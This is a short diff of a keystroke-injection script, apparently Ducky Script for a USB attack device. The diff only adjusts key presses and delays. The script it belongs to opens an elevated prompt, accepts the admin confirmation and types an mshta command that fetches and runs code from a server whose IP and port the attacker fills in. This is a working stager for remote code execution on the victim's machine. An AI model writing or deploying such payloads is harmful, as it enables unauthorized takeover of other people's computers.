@@ -10,7 +10,10 @@ CTRL-SHIFT ENTER
 DELAY 3000
 REM This will permit the window to run as an admin
 ALT y
-DELAY 4000
+REM The double enter below I find reduces the time for the powershell to run cmd prompt. 
+ENTER 
+ENTER
+DELAY 3000
 REM Change the things in the brackets such as your IP address and the port it will communicate through. The subdomain is able to make it unique to only your server (Note that this command will be ran in cmd prompt)
 STRING mshta http://[0.0.0.0]:[PORT]/[string]
 ENTER
